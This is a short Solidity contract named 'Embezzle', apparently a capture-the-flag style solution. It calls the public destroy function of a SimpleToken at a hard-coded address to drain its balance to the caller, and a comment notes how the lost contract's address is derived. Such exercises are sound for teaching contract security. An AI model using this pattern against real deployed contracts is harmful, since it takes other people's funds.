contract Embezzle {
  address payable a = payable(0x201e67995EE5091eeaE5D45235Db57801dE1b4c1);
  SimpleToken s = SimpleToken(a);

  function destroy() public {
    s.destroy(payable(msg.sender));
  }
  //keccack256(address, nonce)
}
